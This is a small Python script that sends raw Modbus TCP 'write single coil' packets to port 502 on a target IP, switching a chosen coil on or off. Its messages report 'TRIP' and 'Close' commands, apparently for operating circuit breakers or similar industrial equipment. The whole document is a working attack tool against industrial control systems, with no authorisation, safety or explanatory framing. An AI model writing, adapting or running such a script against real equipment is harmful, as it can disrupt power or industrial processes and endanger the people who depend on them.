import socket 
import struct 
import time
import argparse
import sys

parser = argparse.ArgumentParser(description='flip a bit')

parser.add_argument('-t', '--target', help='IP to target', action='store', dest='target', default=False)

parser.add_argument('-b', '--bit', help='Bit to flip', action='store', dest='bit', default=False)

parser.add_argument('-o', '--on', help='Turn bit on or off', action='store', 
dest='OnOff', default=False)

parser.add_argument('-p', '--printOut', help='print action', action='store', dest='printOut', default=False)

args = parser.parse_args()

#print(args)

if len(sys.argv) != 9:
		print(len(sys.argv))
		parser.print_help()
		sys.exit(1)

TCP_IP=args.target
TCP_PORT=502
BUFFER_SIZE=1024
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	# socket connect
	sock.connect((TCP_IP, TCP_PORT))
	
	# send packet to force open/command
	if args.OnOff == "on":
		flip=0xff
	else:
		flip=0x00
	if int(args.bit) > 255:
		print("bit should be below 255, if you need to flip bigger bit, call Jonathon")

	# define packet structure
	req=struct.pack('12B', 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 1, 5, 0, int(args.bit), flip, 0x00)

	sock.send(req)
	rec=sock.recv(BUFFER_SIZE)

	# print out actions
	if args.printOut == 'True' and args.OnOff =='on':
		if args.bit == '27':
			print(' [*] TRIP command sent to target {}'.format(args.target))
		elif args.bit == '28': 
			print(' [*] Close command sent to target {}'.format(args.target))
	else: pass

except OSError:
	if args.printOut == 'True':
		print(' [!] No route available to target {}'.format(args.target))
	sys.exit(1)



